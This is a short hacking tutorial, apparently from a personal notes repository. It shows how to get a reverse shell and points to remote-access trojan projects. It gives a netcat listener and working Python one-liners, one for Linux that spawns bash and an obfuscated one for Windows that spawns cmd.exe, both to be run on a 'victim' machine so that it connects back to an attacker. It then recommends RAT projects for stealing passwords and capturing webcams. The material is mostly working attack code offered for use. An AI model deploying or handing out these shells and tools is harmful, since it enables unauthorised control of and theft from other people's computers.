# Simple Reverse shell and RATs
- A [reverse shell](https://resources.infosecinstitute.com/icmp-reverse-shell/) is a type of shell in which the target machine communicates back to the attacking machine. The attacking machine has a listener port on which it receives the connection, which by using, code or command execution is achieved.

<img src="../../media/reverse_shell.png"  alt="reverse shell" width="600" height="200">

- In this case we are going to demonstrate how to get a simple reverse shell using a oneliner python script on a victim with python installed, on a real world scenario, the reverse shell exploit would have to be compiled into a binary file / executable since not everyone has python, see RATs section.

## Reverse Shell Cheat sheets
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

## Simple python oneliner reverse shell

## Attacker's PC
- Lets use netcat to listen for a connection
```bash
nc -l -p 444 -vvv
```

## Victim PC
- On the victim PC execute the following code to get a reverse shell
- Linux
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("Attackers IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```
- Windows
```batch
python -c \"(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('127.0.0.1', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\\\windows\\\\system32\\\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))
```

# RATs

RAT stands for a remote administration tool that when it is installad on a computer allows a remote computer to take control of it. Hackers and malware sometimes install these types of software on a computer in order to take control of them remotely.

The RAT gives the attacker access to your system, just as if they had physical access to your device. With this access, the person can access your files, use your camera, and even turn on/off your device.

## Some good RAT projects to look at
- [Shellverse](https://github.com/jakhax/shellverse) If you want to know how you can write your own R.A.T and add add more exploit like donwload & upload files, take screenshot, capture from webcam, steal passwords e.t.c you should checkout shellverse.
- [pupy](https://github.com/n1nj4sec/pupy) - features an all-in-memory execution guideline and leaves very low footprint. 
- [Telegram RAT](https://github.com/mvrozanti/RAT-via-Telegram) - telegram controlled R.A.T, no need for port forwarding.
